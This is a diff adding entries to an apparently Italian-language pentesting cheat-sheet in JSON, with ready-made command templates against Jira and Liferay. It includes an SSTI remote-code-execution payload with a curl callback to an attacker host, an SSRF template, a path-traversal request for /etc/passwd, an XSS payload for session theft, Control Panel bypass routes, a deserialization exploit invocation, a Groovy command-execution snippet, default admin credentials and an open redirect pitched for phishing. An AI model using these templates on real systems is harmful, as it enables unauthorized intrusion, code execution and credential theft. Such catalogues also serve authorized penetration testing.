+        "template": "curl -sk 'http://<ip>/plugins/servlet/oauth/users/icon-uri?consumerUri=http://<target>'",
+        "description": "SSRF via l'endpoint OAuth icon-uri: l'istanza carica l'URL indicato. Serve a raggiungere risorse interne o la metadata AWS."
+      },
+      {
+        "id": "rce-ssti",
+        "label": "RCE SSTI (CVE-2019-11581)",
+        "template": "# POST a /secure/ContactAdministrators!default.jspa, payload nei campi subject/details:\n$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('<cmd>').waitFor()",
+        "description": "Template injection non autenticata (se il contact form è abilitato e l'SMTP configurato) che esegue comandi come l'utente del servizio Jira. Verifica con un callback: `exec('curl http://<lhost>/x')`."
+      },
+      {
+        "id": "lfi",
+        "label": "Path traversal (CVE-2019-3396)",
+        "template": "curl -sk -X POST 'http://<ip>/rest/tinymce/1/macro/preview' -H 'Content-Type: application/json' -d '{\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\":{\"_template\":\"file:///etc/passwd\"},\"body\":\"\"}}'",
+        "description": "La preview macro di Confluence/Jira Service Desk carica un `_template` arbitrario: `file:///` legge file locali, un URL remoto può portare a RCE via Velocity."
+      },
+      {
+        "id": "xss-wallboard",
+        "label": "XSS Wallboard (CVE-2018-20824)",
+        "template": "http://<ip>/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod=alert(document.domain)",
+        "description": "XSS nel WallboardServlet: il parametro `cyclePeriod` non è sanitizzato ed esegue JavaScript nel contesto della vittima, per rubarne la sessione."
+      }
+    ],
+    "refs": [
+      {
+        "label": "thehackerish — Jira vulnerabilities",
+        "url": "https://thehackerish.com/jira-vulnerabilities-and-how-they-are-exploited-in-the-wild/"
+      },
+      {
+        "label": "Atlassian-Jira-pentesting (CVE-2018-20824)",
+        "url": "https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting#cve-2018-20824-xss-in-wallboardservlet"
+      }
+    ]
+  },
+  {
+    "id": "liferay-enum",
+    "name": "Liferay — fingerprint & endpoint",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Liferay (Portal)",
+    "description": "Liferay è un portale enterprise Java. Si riconosce dal login portlet (`p_p_id=58`), dall'API JSON Web Services su `/api/jsonws`, dal GraphQL su `/o/graphql` e dall'endpoint di licenza. I portlet si enumerano per ID numerico o per nome completo, e il Control Panel è spesso raggiungibile per rotte alternative anche quando il frontend lo nasconde. `/api/jsonws` è insieme superficie di enum e vettore RCE (CVE-2020-7961).",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "liferay",
+      "portal",
+      "jsonws"
+    ],
+    "template": "curl -sk 'http://<ip>/c/portal/license'\ncurl -sk 'http://<ip>/api/jsonws' | head",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "admin"
+      }
+    ],
+    "variants": [
+      {
+        "id": "detect",
+        "label": "Fingerprint",
+        "template": "curl -sk 'http://<ip>/c/portal/license'\ncurl -sk -o /dev/null -w '%{http_code}\\n' 'http://<ip>/?p_p_id=com_liferay_login_web_portlet_LoginPortlet'\ncurl -sk 'http://<ip>/o/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
+        "description": "Conferma Liferay via licenza, login portlet e GraphQL. La versione indirizza verso i CVE noti (riferimento: liferay.dev)."
+      },
+      {
+        "id": "jsonws",
+        "label": "JSON Web Services",
+        "template": "curl -sk 'http://<ip>/api/jsonws?discover'",
+        "description": "Elenca i servizi JSONWS esposti: superficie d'attacco per invocare metodi interni. È anche l'endpoint della RCE CVE-2020-7961."
+      },
+      {
+        "id": "controlpanel",
+        "label": "Control Panel bypass",
+        "template": "# rotte alternative al Control Panel (provale una a una):\ncurl -sk 'http://<ip>/group/control_panel/manage'\ncurl -sk 'http://<ip>/group/guest/control_panel/manage'\ncurl -sk 'http://<ip>/user/<user>/control_panel/manage'",
+        "description": "Il Control Panel amministrativo è raggiungibile per più rotte: una funzionalità nascosta nel frontend resta accessibile via portlet route. Da qui si arriva alla Script Console Groovy."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Tarlogic — Pentesting Liferay",
+        "url": "https://www.tarlogic.com/blog/pentesting-liferay-applications/"
+      },
+      {
+        "label": "Liferay — known vulnerabilities",
+        "url": "https://liferay.dev/portal/security/known-vulnerabilities"
+      }
+    ]
+  },
+  {
+    "id": "liferay-exploit",
+    "name": "Liferay — RCE (JSONWS / Groovy)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Liferay (Portal)",
+    "description": "Le due vie principali alla RCE su Liferay. CVE-2020-7961 sfrutta la deserializzazione di dati non fidati nell'API JSON Web Services (`/api/jsonws`) sulle versioni < 7.2.1, senza autenticazione, con PoC pubblici. Con accesso amministrativo, la Script Console esegue codice Groovy arbitrario, quindi comandi di sistema. Le credenziali di default `test@liferay.com:test` sono un ottimo punto di partenza.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "liferay",
+      "rce",
+      "deserialization",
+      "groovy"
+    ],
+    "template": "# CVE-2020-7961 — deserializzazione JSONWS (Liferay < 7.2.1), usa un PoC pubblico:\ngit clone https://github.com/mzruya/CVE-2020-7961 && cd CVE-2020-7961\npython3 exploit.py http://<ip> '<cmd>'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando",
+        "placeholder": "id"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "jsonws-rce",
+        "label": "RCE JSONWS (CVE-2020-7961)",
+        "template": "# Liferay < 7.2.1 — deserializzazione non autenticata su /api/jsonws\n# usa un PoC pubblico (es. mzruya/CVE-2020-7961 o il modulo relativo):\npython3 exploit.py http://<ip> '<cmd>'",
+        "description": "Deserializzazione di dati non fidati nell'API JSONWS: RCE pre-auth. Diversi PoC su GitHub inviano un gadget Groovy/marshalsec all'endpoint. Verifica prima la versione < 7.2.1."
+      },
+      {
+        "id": "groovy",
+        "label": "Groovy Script Console",
+        "template": "// incolla nella Script Console (Control Panel > Server Administration > Script):\ndef sout = new StringBuilder(), serr = new StringBuilder()\ndef proc = \"<cmd>\".execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln \"$sout $serr\"",
+        "description": "Con accesso admin, la Script Console esegue Groovy: questo snippet lancia un comando di sistema e ne stampa l'output. Via diretta a una reverse shell come utente del server applicativo."
+      },
+      {
+        "id": "defcreds",
+        "label": "Default creds & open redirect",
+        "template": "# credenziali di default classiche:\n# test@liferay.com : test\n# open redirect utili per il phishing:\ncurl -sk 'http://<ip>/html/common/referer_jsp.jsp?referer=http://<lhost>'",
+        "description": "Le installazioni demo mantengono `test@liferay.com:test` con privilegi amministrativi. Gli endpoint `referer_jsp.jsp`/`forward_jsp.jsp` sono open redirect sfruttabili nel phishing."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Tarlogic — Pentesting Liferay",
+        "url": "https://www.tarlogic.com/blog/pentesting-liferay-applications/"
+      },
+      {
+        "label": "Liferay — known vulnerabilities",
+        "url": "https://liferay.dev/portal/security/known-vulnerabilities"
       }
     ]
   }
